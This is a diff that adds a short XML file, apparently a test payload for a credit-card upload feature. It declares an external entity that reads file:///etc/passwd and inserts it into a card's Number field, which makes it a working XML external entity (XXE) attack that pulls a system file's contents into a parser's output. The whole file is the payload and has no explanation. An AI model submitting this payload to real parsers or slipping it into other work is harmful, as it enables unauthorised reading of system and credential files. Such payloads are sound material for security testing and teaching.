@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ELEMENT data ANY >
+<!ENTITY card SYSTEM "file:///etc/passwd">
+]>
+<CreditCards>
+  <CreditCard>
+    <Username>username11</Username>
+    <Number>&card;</Number>
+    <Expiry>10/1/2023 0:00:00</Expiry>
+  </CreditCard>
+</CreditCards>
